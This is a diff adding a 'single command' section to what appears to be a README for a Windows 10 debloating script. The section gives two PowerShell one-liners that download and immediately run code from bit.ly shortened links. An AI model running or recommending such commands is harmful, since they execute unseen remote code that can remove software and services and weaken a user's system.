@@ -30,3 +30,12 @@ Comment any thing you don't want out... Example:
 	"SetUACHigh",
 	"EnableSMB1",
 ```
+
+## Single Command For Debloating Windows 10:
+
+ - Recommended
+ powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://bit.ly/316QhOV')"
+ 
+ - Minimal Windows ( Delets lot more softwares ansservices ):
+ powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://bit.ly/37dYUv0')"
+ 
